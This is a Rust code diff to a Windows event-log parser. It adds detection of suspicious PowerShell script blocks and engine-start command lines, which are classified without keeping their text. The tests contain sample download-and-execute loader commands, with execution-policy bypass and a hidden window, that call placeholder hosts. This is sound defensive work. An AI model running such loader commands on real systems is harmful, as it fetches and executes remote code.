@@ -40,6 +40,11 @@
 //! implied** — a later rule that needs a payload field has to widen this struct deliberately, which
 //! is the review that decision deserves (ADR 0018).
 //!
+//! **One exception, by ADR 0064:** [`powershell_text`] reads the payload of exactly two kinds of event —
+//! a script block Windows PowerShell flagged, and the command line it was started with — and hands each
+//! straight to [`crate::powershell_text::classify`], which keeps kinds and at most a host, never the text.
+//! [`records`] is unchanged and still reads no payload; only a full scan's collector calls the other.
+//!
 //! # The dependency's types stop here
 //!
 //! Binary XML, the chunk layout, the string tables and the recovery of records around a damaged chunk
@@ -327,6 +332,250 @@ fn to_parse_error(error: &EvtxError, stage: Stage) -> ParseError {
             field: "input",
             detail: "the log could not be read".to_owned(),
         },
+    }
+}
+
+// ---------------------------------------------------------------------------------------------------
+// PowerShell's text, classified where it is read (ADR 0064, widening ADR 0018 for two kinds of event)
+// ---------------------------------------------------------------------------------------------------
+
+/// The provider, channel, event id and level of a block Windows PowerShell flagged (ADR 0063, ADR 0064).
+const SCRIPT_BLOCK: (&str, &str, u32, u8) = (
+    "Microsoft-Windows-PowerShell",
+    "Microsoft-Windows-PowerShell/Operational",
+    4104,
+    3,
+);
+
+/// The provider, channel and event id of Windows PowerShell's "engine state changed to Available".
+const ENGINE_START: (&str, &str, u32) = ("PowerShell", "Windows PowerShell", 400);
+
+/// The most text one script block may gather from its parts before the rest is not added.
+const BLOCK_TEXT_MAX: usize = 4 * 1024 * 1024;
+
+/// The most blocks waiting for their remaining parts at one time.
+const PENDING_MAX: usize = 1024;
+
+/// Which of the two kinds of event an entry came from.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum PowerShellSource {
+    /// 4104 at level 3: a script block Windows PowerShell flagged as suspicious, all its parts joined.
+    ScriptBlock,
+    /// 400: the command line Windows PowerShell was started with.
+    EngineStart,
+}
+
+/// One script block or one start, classified. **No text of it is here** (ADR 0064 section 1).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct PowerShellEntry {
+    /// Which kind of event.
+    pub source: PowerShellSource,
+    /// When the record was written; for a block in parts, the last part read.
+    pub written: Timestamp,
+    /// What it held, as kinds.
+    pub classification: crate::powershell_text::Classification,
+    /// `false` for a block some of whose parts the log no longer holds, or whose text passed the size
+    /// limit; it was classified from the parts there were.
+    pub complete: bool,
+}
+
+/// What [`powershell_text`] read from one log.
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub struct PowerShellText {
+    /// One entry per script block and per start, in the order their last record was read.
+    pub entries: Vec<PowerShellEntry>,
+    /// Records of the two kinds this function reads; every other record is passed over unread.
+    pub examined: usize,
+    /// Chunks or records that did not parse, as [`records`] reports them.
+    pub rejected: Vec<RejectedRecord>,
+}
+
+/// Classifies the text of every flagged script block and the command line of every start in one log,
+/// keeping no text (ADR 0064). Every other record is identified and skipped, its payload never read.
+///
+/// This is the only function in this crate that reads an event payload, and it reads exactly two:
+/// `ScriptBlockText` of 4104 at level 3 from `Microsoft-Windows-PowerShell`, and `HostApplication` of
+/// 400 from `PowerShell` — each recognised by provider, channel and id together (ADR 0031). The text is
+/// handed to [`crate::powershell_text::classify`] inside this function and dropped.
+///
+/// # Errors
+///
+/// As [`records`].
+pub fn powershell_text(bytes: &[u8]) -> Result<PowerShellText, ParseError> {
+    if bytes.len() < FILE_HEADER_LEN {
+        return Err(ParseError::Truncated {
+            expected: FILE_HEADER_LEN,
+            found: bytes.len(),
+        });
+    }
+    let mut parser = EvtxParser::from_read_seek(Cursor::new(bytes))
+        .map_err(|error| to_parse_error(&error, Stage::Header))?;
+    let mut out = PowerShellText::default();
+    let mut pending = Pending::default();
+    for outcome in parser.records_json_value() {
+        match outcome {
+            Ok(parsed) => read_powershell_record(&parsed, &mut out, &mut pending),
+            Err(error) => out.rejected.push(RejectedRecord {
+                chunk_number: failed_chunk(&error),
+                record_id: failed_record(&error),
+                reason: to_parse_error(&error, Stage::Record),
+            }),
+        }
+    }
+    pending.flush_all(&mut out.entries);
+    Ok(out)
+}
+
+/// One block's parts as they arrive. The block's id is the map key and never leaves this module.
+#[derive(Debug, Default)]
+struct PartialBlock {
+    parts: std::collections::BTreeMap<u64, String>,
+    total: u64,
+    size: usize,
+    truncated: bool,
+    last_written: Option<Timestamp>,
+    order: u64,
+}
+
+#[derive(Debug, Default)]
+struct Pending {
+    blocks: std::collections::HashMap<String, PartialBlock>,
+    next_order: u64,
+}
+
+impl Pending {
+    fn add(
+        &mut self,
+        id: &str,
+        number: u64,
+        total: u64,
+        text: String,
+        written: Timestamp,
+        out: &mut Vec<PowerShellEntry>,
+    ) {
+        if self.blocks.len() >= PENDING_MAX && !self.blocks.contains_key(id) {
+            self.flush_oldest(out);
+        }
+        let order = self.next_order;
+        let block = self
+            .blocks
+            .entry(id.to_owned())
+            .or_insert_with(|| PartialBlock {
+                order,
+                ..PartialBlock::default()
+            });
+        self.next_order += 1;
+        block.total = block.total.max(total.max(1));
+        block.last_written = Some(written);
+        if block.size.saturating_add(text.len()) > BLOCK_TEXT_MAX {
+            block.truncated = true;
+        } else {
+            block.size += text.len();
+            block.parts.insert(number, text);
+        }
+        let done = u64::try_from(block.parts.len()).unwrap_or(u64::MAX) >= block.total;
+        if (done || block.truncated && number >= block.total)
+            && let Some(block) = self.blocks.remove(id)
+        {
+            out.push(finish(block));
+        }
+    }
+
+    fn flush_oldest(&mut self, out: &mut Vec<PowerShellEntry>) {
+        let oldest = self
+            .blocks
+            .iter()
+            .min_by_key(|(_, b)| b.order)
+            .map(|(id, _)| id.clone());
+        if let Some(block) = oldest.and_then(|id| self.blocks.remove(&id)) {
+            out.push(finish(block));
+        }
+    }
+
+    fn flush_all(&mut self, out: &mut Vec<PowerShellEntry>) {
+        let mut rest: Vec<PartialBlock> = self.blocks.drain().map(|(_, b)| b).collect();
+        rest.sort_by_key(|b| b.order);
+        out.extend(rest.into_iter().map(finish));
+    }
+}
+
+fn finish(block: PartialBlock) -> PowerShellEntry {
+    let complete =
+        !block.truncated && u64::try_from(block.parts.len()).unwrap_or(u64::MAX) >= block.total;
+    let text: String = block.parts.into_values().collect();
+    PowerShellEntry {
+        source: PowerShellSource::ScriptBlock,
+        written: block.last_written.unwrap_or(Timestamp::UNIX_EPOCH),
+        classification: crate::powershell_text::classify(&text),
+        complete,
+    }
+}
+
+fn read_powershell_record(
+    parsed: &SerializedEvtxRecord<Value>,
+    out: &mut PowerShellText,
+    pending: &mut Pending,
+) {
+    let identity = record(parsed);
+    let is = |provider: &str, channel: &str, id: u32| {
+        identity.provider.as_deref() == Some(provider)
+            && identity.channel.as_deref() == Some(channel)
+            && identity.event_id == Some(id)
+    };
+    let data = parsed
+        .data
+        .get("Event")
+        .and_then(|event| event.get("EventData"));
+    if is(SCRIPT_BLOCK.0, SCRIPT_BLOCK.1, SCRIPT_BLOCK.2) && identity.level == Some(SCRIPT_BLOCK.3)
+    {
+        out.examined += 1;
+        let field = |name: &str| data.and_then(|d| d.get(name)).map(scalar);
+        let text = field("ScriptBlockText")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .to_owned();
+        let part = field("MessageNumber").and_then(number).unwrap_or(1);
+        let total = field("MessageTotal").and_then(number).unwrap_or(1);
+        // A block with no id cannot be joined with its other parts, so it stands alone.
+        let id = field("ScriptBlockId").and_then(Value::as_str).map_or_else(
+            || format!("\u{0}record-{}", parsed.event_record_id),
+            str::to_owned,
+        );
+        pending.add(&id, part, total, text, parsed.timestamp, &mut out.entries);
+    } else if is(ENGINE_START.0, ENGINE_START.1, ENGINE_START.2) {
+        out.examined += 1;
+        let command = data.and_then(host_application).unwrap_or_default();
+        out.entries.push(PowerShellEntry {
+            source: PowerShellSource::EngineStart,
+            written: parsed.timestamp,
+            classification: crate::powershell_text::classify(&command),
+            complete: true,
+        });
+    }
+}
+
+/// `HostApplication=…` from a classic 400's data strings, wherever the rendering put them: a list, a
+/// list under `#text`, or one string.
+fn host_application(data: &Value) -> Option<String> {
+    let mut found = None;
+    walk_strings(data, &mut |s| {
+        if found.is_none()
+            && let Some(at) = s.find("HostApplication=")
+        {
+            let rest = s.get(at + "HostApplication=".len()..).unwrap_or("");
+            let line = rest.split(['\r', '\n']).next().unwrap_or("");
+            found = Some(line.trim().to_owned());
+        }
+    });
+    found
+}
+
+fn walk_strings(value: &Value, f: &mut dyn FnMut(&str)) {
+    match value {
+        Value::String(s) => f(s),
+        Value::Array(items) => items.iter().for_each(|v| walk_strings(v, f)),
+        Value::Object(map) => map.values().for_each(|v| walk_strings(v, f)),
+        _ => {}
     }
 }
 
@@ -858,5 +1107,248 @@ mod tests {
         for length in (0..every_byte.len()).step_by(101) {
             let _ = records(&every_byte[..length]);
         }
+    }
+}
+
+#[cfg(test)]
+mod powershell_tests {
+    use evtx::SerializedEvtxRecord;
+    use jiff::Timestamp;
+    use serde_json::{Value, json};
+
+    use super::{
+        Pending, PowerShellSource, PowerShellText, powershell_text, read_powershell_record,
+    };
+
+    const LANGUAGE_PACK: &[u8] =
+        include_bytes!("../../../fixtures/evtx/languagepacksetup-operational.evtx");
+
+    /// A record as `records_json_value` renders one: `System` with the four fields this crate reads,
+    /// and an `EventData` in the shape the provider gives it.
+    fn rendered(
+        id: u64,
+        provider: &str,
+        channel: &str,
+        event_id: u32,
+        level: u8,
+        data: &Value,
+    ) -> SerializedEvtxRecord<Value> {
+        SerializedEvtxRecord {
+            event_record_id: id,
+            timestamp: Timestamp::from_second(1_791_000_000 + i64::try_from(id).unwrap_or(0))
+                .unwrap_or(Timestamp::UNIX_EPOCH),
+            data: json!({ "Event": {
+                "System": {
+                    "Provider": { "#attributes": { "Name": provider } },
+                    "EventID": event_id, "Level": level, "Channel": channel,
+                    "Computer": "WORKSTATION-7"
+                },
+                "EventData": data.clone()
+            }}),
+        }
+    }
+
+    fn block(
+        id: u64,
+        part: u64,
+        total: u64,
+        block_id: &str,
+        text: &str,
+    ) -> SerializedEvtxRecord<Value> {
+        rendered(
+            id,
+            "Microsoft-Windows-PowerShell",
+            "Microsoft-Windows-PowerShell/Operational",
+            4104,
+            3,
+            &json!({
+                "MessageNumber": part, "MessageTotal": total, "ScriptBlockText": text,
+                "ScriptBlockId": block_id, "Path": "C:\\Users\\alex\\secret-notes.ps1"
+            }),
+        )
+    }
+
+    fn read(records: &[SerializedEvtxRecord<Value>]) -> PowerShellText {
+        let mut out = PowerShellText::default();
+        let mut pending = Pending::default();
+        for r in records {
+            read_powershell_record(r, &mut out, &mut pending);
+        }
+        pending.flush_all(&mut out.entries);
+        out
+    }
+
+    #[test]
+    fn a_log_with_neither_kind_examines_nothing() {
+        let text = powershell_text(LANGUAGE_PACK).unwrap_or_default();
+        assert_eq!(text.examined, 0);
+        assert!(text.entries.is_empty());
+        assert_eq!(
+            text.rejected.len(),
+            super::records(LANGUAGE_PACK).map_or(0, |f| f.rejected.len())
+        );
+    }
+
+    #[test]
+    fn a_flagged_block_in_parts_is_joined_before_it_is_classified() {
+        // `DownloadString` is split across the two parts, and the parts arrive out of order.
+        let out = read(&[
+            block(
+                2,
+                2,
+                2,
+                "{b1}",
+                "loadString('https://two.example.invalid/x')",
+            ),
+            block(1, 1, 2, "{b1}", "iex (New-Object Net.WebClient).Down"),
+        ]);
+        assert_eq!(out.examined, 2);
+        assert_eq!(out.entries.len(), 1);
+        let entry = &out.entries[0];
+        assert_eq!(entry.source, PowerShellSource::ScriptBlock);
+        assert!(entry.complete);
+        assert!(entry.classification.kinds.download_then_execute);
+        assert_eq!(
+            entry.classification.download_host,
+            Some(crate::powershell_text::DownloadHost::Name(
+                "two.example.invalid".to_owned()
+            ))
+        );
+    }
+
+    #[test]
+    fn a_block_whose_parts_rotated_out_is_classified_and_marked_incomplete() {
+        let out = read(&[block(5, 2, 3, "{b2}", "Add-Type -MemberDefinition x")]);
+        assert_eq!(out.entries.len(), 1);
+        assert!(!out.entries[0].complete);
+        assert!(out.entries[0].classification.kinds.native_interop);
+    }
+
+    #[test]
+    fn only_the_two_kinds_are_read() {
+        let loader = "iex (irm https://x.example.invalid)";
+        let out = read(&[
+            // Verbose 4104: every block when logging is on, which ADR 0064 does not read.
+            rendered(
+                1,
+                "Microsoft-Windows-PowerShell",
+                "Microsoft-Windows-PowerShell/Operational",
+                4104,
+                5,
+                &json!({ "MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": loader, "ScriptBlockId": "{v}" }),
+            ),
+            // PowerShell 7's own provider and channel (ADR 0063 section 3).
+            rendered(
+                2,
+                "PowerShellCore",
+                "PowerShellCore/Operational",
+                4104,
+                3,
+                &json!({ "MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": loader, "ScriptBlockId": "{c}" }),
+            ),
+            // 4103 at level 3 on the right channel.
+            rendered(
+                3,
+                "Microsoft-Windows-PowerShell",
+                "Microsoft-Windows-PowerShell/Operational",
+                4103,
+                3,
+                &json!({ "Payload": loader }),
+            ),
+            // 400 from another provider.
+            rendered(
+                4,
+                "Some-Other-Provider",
+                "Windows PowerShell",
+                400,
+                4,
+                &json!({ "Data": [format!("HostApplication={loader}")] }),
+            ),
+        ]);
+        assert_eq!(out.examined, 0);
+        assert!(out.entries.is_empty());
+    }
+
+    #[test]
+    fn a_start_is_classified_from_host_application_in_any_rendering() {
+        let detail = "\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tHostName=ConsoleHost\r\n\tHostApplication=powershell.exe -ExecutionPolicy Bypass -w h -c \"irm https://s.example.invalid/a | iex\"\r\n\tEngineVersion=5.1\r\n";
+        for data in [
+            json!({ "Data": ["Available", "None", detail] }),
+            json!({ "Data": { "#text": ["Available", "None", detail] } }),
+            json!({ "Data": detail }),
+        ] {
+            let out = read(&[rendered(
+                9,
+                "PowerShell",
+                "Windows PowerShell",
+                400,
+                4,
+                &data,
+            )]);
+            assert_eq!(out.examined, 1);
+            let k = out.entries[0].classification.kinds;
+            assert_eq!(out.entries[0].source, PowerShellSource::EngineStart);
+            assert!(k.download_then_execute && k.execution_policy_bypass && k.hidden_window);
+        }
+        // A 400 without HostApplication is examined and holds no kind.
+        let out = read(&[rendered(
+            10,
+            "PowerShell",
+            "Windows PowerShell",
+            400,
+            4,
+            &json!({ "Data": ["Available"] }),
+        )]);
+        assert_eq!(
+            (out.examined, out.entries[0].classification.kinds.any()),
+            (1, false)
+        );
+    }
+
+    #[test]
+    fn no_text_of_a_record_reaches_the_result() {
+        let out = read(&[
+            block(
+                1,
+                1,
+                1,
+                "{6f1c-secret-block-id}",
+                "$password = 'hunter2'; iex (irm https://k.example.invalid/key/ABC?t=zz)",
+            ),
+            rendered(
+                2,
+                "PowerShell",
+                "Windows PowerShell",
+                400,
+                4,
+                &json!({ "Data": ["\tHostApplication=powershell.exe -c Get-Secret -Vault personal-vault\r\n"] }),
+            ),
+        ]);
+        let all = format!("{out:?}");
+        for text in [
+            "hunter2",
+            "password",
+            "6f1c",
+            "secret-notes",
+            "alex",
+            "WORKSTATION",
+            "ABC",
+            "zz",
+            "personal-vault",
+            "Get-Secret",
+        ] {
+            assert!(!all.contains(text), "{text} leaked: {all}");
+        }
+    }
+
+    #[test]
+    fn a_block_larger_than_the_limit_is_cut_and_marked_incomplete() {
+        let big = "x".repeat(super::BLOCK_TEXT_MAX);
+        let out = read(&[
+            block(1, 1, 2, "{big}", &big),
+            block(2, 2, 2, "{big}", "iex"),
+        ]);
+        assert_eq!(out.entries.len(), 1);
+        assert!(!out.entries[0].complete);
     }
 }
